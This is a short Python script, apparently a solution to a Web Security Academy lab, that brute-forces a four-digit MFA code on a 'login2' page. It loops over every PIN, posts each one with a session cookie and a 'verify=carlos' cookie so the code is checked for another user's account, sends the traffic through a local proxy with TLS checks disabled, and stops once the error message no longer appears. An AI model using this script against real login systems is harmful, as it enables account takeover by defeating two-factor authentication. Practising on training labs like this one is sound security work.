import itertools
import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0afe009904c8f296c1b2c7ec00d20095.web-security-academy.net/login2'
numbers = '0123456789'  # you could use '0123456789' but that would take very long
y = ''
Cookies = {'session' : 'r9jEoNdrMaBECaP77q695VaWMRM7K6K3', 'verify' : 'carlos'}

for length in range(4, 5):
  for c in itertools.product(numbers, repeat=length):
    pin = y+''.join(c)
    data = {'mfa-code' : pin} 
    r = requests.post(URl, cookies=Cookies, verify=False, proxies=proxies, data=data)
    if "Incorrect security code" in r.text:
        print("current at code %s..." %pin)
    else:
        print("Found! Verification code is %s!" %pin)
        break